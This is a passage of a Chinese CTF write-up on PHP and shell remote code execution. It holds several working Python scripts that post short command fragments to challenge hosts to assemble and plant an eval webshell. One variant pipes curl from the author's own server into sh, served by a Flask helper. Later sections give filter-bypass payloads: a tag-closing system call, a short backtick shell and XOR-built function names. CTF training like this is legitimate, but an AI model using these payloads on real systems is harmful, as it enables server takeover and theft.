class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:42</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;kt-&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><span class="hljs-string">&#x27;sh x&#x27;</span>,<br><span class="hljs-string">&#x27;sh j&#x27;</span><br>]<br><span class="hljs-comment">#&lt;?php eval($_GET[1]);?&gt;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写"><a href="#环境无dir，可写" class="headerlink" title="环境无dir，可写"></a>环境无dir，可写</h5><p>思路是通过<code>ls</code>，<code>mv</code>，<code>cat</code>构造出<code>ls -t&gt;a</code>，再<code>curl</code>写一句话</p><p>具体操作如下：</p><p>先将<code>ls -t&gt;a</code>写入<code>z</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-1.png"></p><p>倒序写入<code>curl 335708495|sh</code>，注意服务器的ip要先转int</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-2.png"></p><p>服务器上用<code>flask</code>写个<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先执行<code>sh z</code>，即执行了<code>ls -t&gt;a</code>，即向<code>a</code>写入<code>curl 335708495|sh</code>，再<code>sh a</code>，就执行了<code>curl 335708495|sh</code>，并返回<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code>，成功写入<code>1.php</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h5><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>$&#123;IFS&#125;</code>代替空格，变成<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p><p>步骤与<code>4字符-环境无dir，可写</code>基本一致，只是替换了<code>curl命令</code>，变成了<code>echo ...</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h3 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h3><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>$&#123;IFS&#125;</code>代替，只要命令部分不出现重复的字符组合就行</p><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p><code>eval()</code>，<code>assert()</code>，<code>preg_replace()</code>，<code>create_function()</code>，<code>array_map()</code>，<code>call_user_func()</code>，<code>call_user_func_array()</code>，<code>array_filter()</code>，<code>uasort()</code>，<code>array_walk_recursive</code>等</p><h2 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h2><p>某些题目表面上没有禁用函数，实际上在<code>php.ini</code>中使用了<code>disable_functions</code>来禁用函数</p><p>可以通过蚁剑的插件或手工绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/disable_functions.png"></p><p>小trick：<code>get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);</code></p><h2 id="标签闭合绕过"><a href="#标签闭合绕过" class="headerlink" title="标签闭合绕过"></a>标签闭合绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\;/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>闭合了标签，那就造一个新的标签<code>&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;</code></p><p>小trick：<code>&lt;/script&gt;结束标签自带一个;</code></p><h2 id="标签闭合-长度限制"><a href="#标签闭合-长度限制" class="headerlink" title="标签闭合+长度限制"></a>标签闭合+长度限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&lt;=<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个小于13位的参数：<code>&lt;?`$_GET[2]`;</code></p><p>然后可以利用<code>&amp;2</code>传入反弹shell的命令等操作</p><h2 id="无字母数字代码执行"><a href="#无字母数字代码执行" class="headerlink" title="无字母数字代码执行"></a>无字母数字代码执行</h2><p>也是很经典的一类题目，参数中不能出现字母和数字<br>思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><h3 id="异或xor"><a href="#异或xor" class="headerlink" title="异或xor"></a>异或xor</h3><p>在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是相同为零，不同为一</p><p>例如<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)</code>，异或后得到<code>system</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/xor.png"></p><p>yu师傅的脚本，用来生成一个字典</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span 